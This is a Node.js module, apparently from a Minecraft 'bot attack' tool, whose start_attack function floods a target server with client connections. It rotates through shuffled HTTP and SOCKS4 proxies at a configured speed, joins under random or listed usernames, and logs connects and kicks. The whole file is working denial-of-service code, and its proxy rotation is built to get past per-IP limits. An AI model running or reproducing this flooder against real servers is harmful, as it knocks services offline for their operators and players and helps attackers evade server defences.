const minecraft = require('minecraft-protocol');
const Http = require('http');
const crypto = require('crypto');
const socks = require('socks');
const { ProxyAgent } = require('proxy-agent');

const { log } = require("./cmd");
const { proxiesType } = require("./proxy");

async function start_attack(config, proxies, usernames) {
    log(`Starting attack on ${config["host"]} with ${proxies.length} proxies`);

    let index = 0;
    proxies = shuffle(proxies);

    let interval = setInterval(() => {
        if (index >= proxies.length) {
            clearInterval(interval);
            return;
        }

        const proxy = proxies[index];

        const splitted = proxy.split(':');
        const proxyHost = splitted[0];
        const proxyPort = splitted[1];

        let username = undefined;

        if (usernames.length > 0) {
            username = usernames[getRandomArbitrary(0, usernames.length)];
        } else {
            username = crypto.createHash('md5').update("" + getRandomArbitrary(0, 9500)).digest("hex").substring(1, getRandomArbitrary(7, 14));
        }

        joinServer(config["host"], config["port"], proxyHost, proxyPort, username, config["version"]);

        index++;
    }, config["speed"]);
}

async function joinServer(host, port, proxyHost, proxyPort, username, version) {
    const proxyType = proxiesType[proxyPort];

    let minecraftClient = null;
    let failed = false;

    if (typeof proxyType === 'undefined' || proxyType === "HTTP") {
        try {
            minecraftClient = minecraft.createClient({
                connect: (client) => {
                    const req = Http.request({
                        host: proxyHost,
                        port: proxyPort,
                        method: 'CONNECT',
                        path: `${host}:${port}`,
                        timeout: 2000,
                    });

                    client.on('error', function (err) {
                        failed = true;
                        return;
                    });

                    req.end();

                    req.on('connect', (res, stream) => {
                        if (failed) return;

                        client.setSocket(stream);
                        client.emit('connect');
                    })
                },
                username: username,
                version: version,
                agent: new ProxyAgent({ protocol: 'http', host: proxyHost, port: proxyPort }),
            });
        } catch (e) {
            failed = true;
        }
    } else if (proxyType === "SOCKS") {
        minecraftClient = minecraft.createClient({
            connect: (client) => {
                socks.createConnection({
                    proxy: {
                        ipaddress: proxyHost,
                        port: proxyPort,
                        type: 4
                    },
                    target: {
                        host: host,
                        port: parseInt(port)
                    },
                    timeout: 1200
                }, function (err, socket) {
                    if (!err) {
                        client.setSocket(socket);
                        client.emit('connect');
                    }
                })
            },
            username: username,
            version: version
        })
    }

    if (failed || minecraftClient == null) return;

    // Minecraft client is created

    minecraftClient.on("kick_disconnect", (packet) => {
        log(`[${username}] kicked for ${packet.reason}`);
    });

    minecraftClient.on("disconnect", (packet) => {
        log(`[${username}] disconnected ${packet.reason}`);
    });

    minecraftClient.on("state", (_state) => {
        let state = "" + _state;

        if (state === "play") {
            log(`[${username}] connected!`);
        }
    });
}

function getRandomArbitrary(min, max) {
    return parseInt(Math.random() * (max - min) + min);
}

const shuffle = (array) => {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
};

module.exports = { start_attack };